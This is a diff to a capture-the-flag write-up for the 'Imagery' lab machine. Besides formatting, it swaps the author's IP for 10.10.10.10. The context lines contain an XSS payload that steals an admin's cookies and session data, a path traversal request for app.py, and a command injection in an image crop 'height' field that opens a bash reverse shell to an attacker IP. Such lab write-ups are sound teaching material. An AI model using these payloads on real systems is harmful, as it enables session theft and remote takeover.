@@ -100,15 +100,18 @@ GET http://imagery.htb:8000/get_image_collections
 Examining the JavaScript reveals hidden functionality:
 
 **Pages:**
+
 - adminPanel
 
 **Variables:**
+
 - isAdmin
 - loggedInUserIsTestUser
 - loggedInEmail
 - loggedInUserDisplayId
 
 **Test Endpoints:**
+
 - /edit_image_details
 - /convert_image
 - /apply_visual_transform
@@ -117,6 +120,7 @@ Examining the JavaScript reveals hidden functionality:
 - /create_image_collection
 
 **Admin Endpoints:**
+
 - /admin/users
 - /admin/bug_reports
 - /admin/delete_user
@@ -163,7 +167,7 @@ We craft a payload to steal the admin's cookies, local storage, and session data
 <img
   src="x"
   onerror="(async function(){
-  const YOUR_SERVER_IP = '10.10.15.79';
+  const YOUR_SERVER_IP = '10.10.10.10';
 
   try {
     // Collect User-Agent
@@ -255,6 +259,7 @@ http://imagery.htb:8000/admin/get_system_log?log_identifier=../app.py
 ```
 
 Discovered files:
+
 - api_admin.py
 - api_auth.py
 - api_edit.py
@@ -366,7 +371,7 @@ Then send a malicious crop request via Burp:
     "x": "0",
     "y": "0",
     "width": "100",
-    "height": "100; bash -c 'bash -i >& /dev/tcp/10.10.15.79/1234 0>&1'; #"
+    "height": "100; bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'; #"
   }
 }
 ```
